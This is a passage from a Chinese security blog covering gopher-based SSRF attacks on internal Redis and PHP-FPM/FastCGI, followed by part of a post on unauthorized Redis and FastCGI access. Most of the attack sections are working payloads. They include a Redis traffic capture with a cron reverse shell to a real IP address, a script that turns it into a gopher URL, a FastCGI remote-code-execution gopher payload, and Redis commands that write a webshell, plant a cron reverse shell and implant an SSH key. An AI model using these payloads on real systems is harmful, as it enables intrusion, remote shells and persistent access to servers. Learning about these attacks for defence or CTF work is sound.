<p><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p>
<p>另外开启一个窗口运行<code>shell.sh</code></p>
<p>抓到的流量如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">2019&#x2F;06&#x2F;30 11:42:08.082682  length&#x3D;18 from&#x3D;0 to&#x3D;17</span><br><span class="line">*1\r</span><br><span class="line">$8\r</span><br><span class="line">flushall\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.092805  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.097266  length&#x3D;88 from&#x3D;0 to&#x3D;87</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$61\r</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.224.236.99&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.097445  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line"></span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.101113  length&#x3D;57 from&#x3D;0 to&#x3D;56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.101333  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.105326  length&#x3D;52 from&#x3D;0 to&#x3D;51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.105483  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.108754  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.118761  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">2019&#x2F;06&#x2F;30 11:42:08.122934  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2019&#x2F;06&#x2F;30 11:42:08.123111  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure>

<p>转换为<code>gopher</code>的规则为：</p>
<ul>
<li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li>
<li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li>
<li>将\r字符串替换成%0d%0a</li>
<li>空白行替换为%0a</li>
</ul>
<p>别的师傅写好的转化脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure>

<p>转换完结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;139.224.236.99&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a</span><br></pre></td></tr></table></figure>

<p>最终攻击效果</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Zlv7Mn.png" alt="Zlv7Mn.png"></p>
<p>其实想要的结果对应的键对值这样..完全不必用反弹shell这么麻烦的方法..</p>
<p>例如key中有我们想要的结果.我们完全可以通过如下操作拿到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_keys%20*%20%0d%0aquit&quot;</span><br><span class="line"></span><br><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_type%20flag%0d%0aquit&quot;</span><br><span class="line"></span><br><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_get%20flag%0d%0aquit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/06/30/ZlzptS.png" alt="ZlzptS.png"></p>
<h3 id="gopher协议攻击内网Fastcgi"><a href="#gopher协议攻击内网Fastcgi" class="headerlink" title="gopher协议攻击内网Fastcgi"></a>gopher协议攻击内网Fastcgi</h3><p>在上次博客中写了<code>Fastcgi</code>未授权访问，如果外网开了9000端口，可能造成任意php代码执行，如果没开，可以通过ssrf打一波，下面来介绍一下<code>ssrf</code>的操作</p>
<p>通过将流量打到3333端口，再进行编码操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php -c &quot;&lt;?php echo &#96;pwd&#96;; ?&gt;&quot; -p 2333</span><br></pre></td></tr></table></figure>

<p>另外开一个端口</p>
<p><code>nc -lvvp 3333&gt; gopher.txt</code></p>
<p>再利用<code>python quote</code>函数编码得到<code>gopher</code>的<code>payload</code></p>
<p>其实这样很是麻烦，可以利用<code>gopherus</code>直接转化出<code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH69%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;usr&#x2F;share&#x2F;php&#x2F;PEAR.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00E%04%00%3C%3Fphp%20system%28%27%3C%3Fphp%20phpinfo%28%3B%3F%3E%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>

<p>github地址：</p>
<p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%e6%94%bb%e5%87%bb%e5%86%85%e7%bd%91%e5%ba%94%e7%94%a8%e5%a4%8d%e7%8e%b0/</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/30/Gopher%E5%8D%8F%E8%AE%AE%E9%82%82%E9%80%85%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/" data-id="ckabsu3830012kkvrhxm04455" class="article-share-link" data-share="baidu" data-title="Gopher协议邂逅内网应用">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/30/Gopher%E5%8D%8F%E8%AE%AE%E9%82%82%E9%80%85%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Redis-Fastcgi未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/30/Redis-Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2019-06-30T01:06:15.000Z" itemprop="datePublished">2019-06-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/30/Redis-Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Redis&amp;Fastcgi未授权访问漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><h3 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h3><p>Redis是一个使用<code>ANSI C</code>编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。Redis未授权访问的原因产生于未能正确的配置<code>/etc/redis.conf</code>的内容。</p>
<p>如<code>bind</code>开启的是<code>0.0.0.0</code>或者没有开启保护模式等等。造成危险操作未授权访问。并且未授权访问可以造成很多危害。</p>
<h3 id="redis未授权访问常见命令操作"><a href="#redis未授权访问常见命令操作" class="headerlink" title="redis未授权访问常见命令操作"></a>redis未授权访问常见命令操作</h3><ul>
<li>查看所有键</li>
</ul>
<p><code>keys *</code></p>
<ul>
<li>查看版本等敏感信息</li>
</ul>
<p><code>info</code></p>
<ul>
<li>设置键值与查看键值</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set xxx   xxxx</span><br><span class="line"></span><br><span class="line">get xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>设置配置信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename xxx</span><br><span class="line"></span><br><span class="line">config get dbfilename</span><br></pre></td></tr></table></figure>

<ul>
<li>删除数据库的所有键值对</li>
</ul>
<p><code>flushall</code></p>
<h3 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h3><p>在较低权限下可利用此方法写webshell，payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line"></span><br><span class="line">set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>即可在公网下生成文件</p>
<p><a href="https://imgchr.com/i/ZMRn29" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/28/ZMRn29.md.png" alt="ZMRn29.md.png"></a></p>
<p>在实战中产生的问题，当键值对过多，无法直接<code>save</code>到我们的<code>webshell.php</code>中，所以可以通过<code>flushall</code>来清楚所有的键值对，再来写入我们的<code>shell</code>，不过这个方法影响太大了…不太建议使用。</p>
<h3 id="redis利用定时任务-corntab-反弹shell"><a href="#redis利用定时任务-corntab-反弹shell" class="headerlink" title="redis利用定时任务(corntab)反弹shell"></a>redis利用定时任务(corntab)反弹shell</h3><p>限定条件：<strong>在redis以root权限运行时可以写crontab执行命令反弹shell</strong></p>
<p>crontab介绍：linux的定时任务主要使用<code>crontab</code>文件中加入定时任务执行，目录为<code>/var/spool/cron</code>下,文件名对应着执行该定时任务的用户名。</p>
<p>操作payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set aaa &quot;\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;your_port 0&gt;&amp;1\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line"></span><br><span class="line">config set dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><code>\n\n</code>的作用为和其他内容进行分离，通过在cron目录下写计划任务，即可反弹shell</p>
<p><a href="https://imgchr.com/i/ZMf7v9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/28/ZMf7v9.md.png" alt="ZMf7v9.md.png"></a></p>
<p>注意点：crontab无法在<code>debian,ubuntu</code>上反弹，因为这两个系统对计划任务的格式要求很严，必须执行</p>
<p><code>crontab -u root /var/spool/cron/crontabs/root</code></p>
<h3 id="redis写入SSH公钥进行直连"><a href="#redis写入SSH公钥进行直连" class="headerlink" title="redis写入SSH公钥进行直连"></a>redis写入SSH公钥进行直连</h3><p>首先生成公钥</p>
<p><a href="https://imgchr.com/i/ZMhm8g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/28/ZMhm8g.md.png" alt="ZMhm8g.md.png"></a></p>
<p>将公钥利用如下<code>payload</code>放到靶机的<code>~/.ssh</code>中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line"></span><br><span class="line">config set dbfilename  authorized_keys</span><br><span class="line"></span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZS8alMMMzm8OXIcuTpbMf6wBfIrFzbInhZeteZh2PrHXiiG0UHlKHcZ&#x2F;l&#x2F;INRfNC3hFWVnc4zD1ch              96FJcszytymwK&#x2F;+pNKH&#x2F;qpw0oUPF86ihXSoLDDGuXApBW9fNww8MYvHxL&#x2F;UAOdb+zZ4KgVcAuPsEFiyOa9M2BgnR5Qie9ImRVux+KmWI+Y2S2IvnTkcw   z3b+dJUmfhHdf7Q+mz8xszhYNE2DAgUNxWngUd+61jdZssfn0eufY8sXOnARdVlvUb69Aeq&#x2F;m9LxqCuwNVJajCqs2pdUqZxinyeqGUceZQbUNVJp1JxcduD3pxgSmoXGRDLwDbMOg3XNSxSrKsqnroot@VM_0_6_centos\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>在本机中利用私钥连接</p>
<p><code>[root@VM_0_6_centos .ssh]# ssh -i id_rsa root@your_vps</code></p>
<p><strong>防御手段</strong></p>
<ul>
<li><code>bind</code>设置为<code>127.0.0.1</code></li>
<li><code>redis.conf</code>中开启保护模式</li>
</ul>
<h2 id="Fastcgi未授权访问"><a href="#Fastcgi未授权访问" class="headerlink" title="Fastcgi未授权访问"></a>Fastcgi未授权访问</h2><p>之前有跟着p牛的文章过了一遍<code>Fastcgi</code>，下面再学习理解一遍。</p>
<h3 id="Fastcgi介绍"><a href="#Fastcgi介绍" class="headerlink" title="Fastcgi介绍"></a>Fastcgi介绍</h3><p><code>Fastcgi</code>与<code>http</code>协议一样都是一个通信协议。<strong><code>http</code>协议的作用为在浏览器与服务器之间进行数据交换。过程为：浏览器将http头与http体组合为数据包，以tcp形式发送给服务器中间件，服务器中间件进行解析，在服务器上拿到对应的数据，并以http形式打包发回给浏览器。</strong></p>
<p><strong>Fastcgi协议</strong></p>
<p>如果我们请求的链接为一个静态页面，那么就会按照http协议这个流程发送给服务器中间件，服务器中间件去解码并且在服务器上拿到对应的资源然后按照tcp形式打包返回给浏览器</p>
<p><img src="http://img.php.cn/upload/article/000/153/291/6c9bcffa8cfbeeb8c79eaf3705720116-0.png" alt="img"></p>
<p>如果我们请求的是动态页面，如<code>index.php</code>，则过程图如下：</p>
<p><img src="http://img.php.cn/upload/article/000/153/291/6c9bcffa8cfbeeb8c79eaf3705720116-1.png" alt="img"></p>
<p>浏览器首先发送请求给服务器中间件<code>Nginx</code>，<code>Nginx</code>将用户请求以<code>Fastcgi</code>的规则打包好通过<code>tcp</code>传给<code>PHP-FPM</code>，<code>PHP-FPM</code>按照<code>Fastcgi</code>协议将<code>tcp</code>流解析为真正的数据，即先解析<code>php.ini</code>文件，初始化执行环境，处理请求，并将最终数据以返回给<code>web-Server</code>。</p>
<h3 id="PHP-FPM介绍"><a href="#PHP-FPM介绍" class="headerlink" title="PHP-FPM介绍"></a><strong>PHP-FPM介绍</strong></h3><p><code>PHP-FPM</code>其实在上述的协议图中已经透露出了他的作用，<code>PHP-FPM(PHP FastCGI Process Manager)</code>意：<code>PHP FastCGI</code>进程管理器，用于管理<code>PHP</code>进程池的软件，用于接受web服务器的请求。在上述流程中，<code>php-fpm</code>通过解析<code>php.ini</code>,初始化执行环境，才会将<code>tcp</code>流按照<code>fastcgi</code>形式解析为真正的数据。</p>
<p>当用户访问<a href="http://127.0.0.1/index.php?a=&amp;b=2,如对应的web目录为`/var/www/html`,`nginx`会将请求变为如下键值对" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=&amp;b=2,如对应的web目录为`/var/www/html`,`nginx`会将请求变为如下键值对</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些键值对其实就是对应的环境变量，<code>php-fpm</code>通过这些去初始化执行环境返回请求。大致过程为<code>PHP-FPM</code>通过<code>fastcgi</code>解析中间件传过来的<code>tcp</code>数据,按照这些键值对的环境变量去初始化执行环境，并执行<code>SCRIPT_NAME</code>所指向的文件，在本例子中执行的是<code>/var/www/html/index.php</code>。</p>
<h3 id="安全性思考"><a href="#安全性思考" class="headerlink" title="安全性思考"></a>安全性思考</h3><p>如果我们能控制<code>SCRIPT_NAME</code>所对应的值，那么其实就是可以执行我们想要的<code>php</code>文件..但是这个似乎不能实现，不过<code>nginx</code>解析漏洞则<code>&quot;变相&quot;</code>实现了这一点。</p>
<p>如果用户访问<a href="http://127.0.0.1/favicon.ico/.php，nginx则对应发送如下键值对给php-fpm" target="_blank" rel="noopener">http://127.0.0.1/favicon.ico/.php，nginx则对应发送如下键值对给php-fpm</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>fix_pathinfo</code>选项在试别到<code>/var/www/html/favicon.ico/.php</code>时，发现这个文件时不存在在的，则会去掉<code>/.php</code>，将<code>favicon.ico</code>当作<code>php</code>文件执行，为了防范此漏洞，<code>fpm</code>中默认增加了一个配置选项<code>security.limit_extensions</code>，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure>

<p>这样只会解析特定后缀的文件，避免产生上述的漏洞情况。</p>
<h3 id="攻击点-未授权访问漏洞的产生"><a href="#攻击点-未授权访问漏洞的产生" class="headerlink" title="攻击点(未授权访问漏洞的产生)"></a>攻击点(未授权访问漏洞的产生)</h3><p>在<code>php.ini</code>中有两个配置选项,<code>auto_prepend_file</code>与<code>auto_append_file</code>,</p>
<p><code>auto_prepend_file</code>作用为，在执行目标文件之前，先包含<code>auto_prepend_file</code>指定的文件。<code>auto_append_file</code>作用为，在执行目标文件之后，再包含<code>auto_prepend_file</code>中指定的文件。所以<code>auto_prepend_file</code>去配合<code>php://input</code>则会产生奇效，去执行我们body中的任意php代码。</p>
<p><strong>设置<code>auto_prepend_file</code>的方法</strong></p>
<p><code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。</p>
<p><strong>找到一个php文件的绝对路径</strong></p>
<p>上述的<code>security.limit_extensions</code>选项限制了我们只能执行特定后缀的文件，所以我们必须找到一个php文件的绝对路径，才能触发此漏洞，可以通过默认源安装文件进行触发如<code>/usr/local/lib/php/PEAR.php</code>,再debian7上存在的文件是<code>/var/cache/dictionaries-common/sqspell.php</code>，所以通过传入如下键值对就可以任意php代码执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: 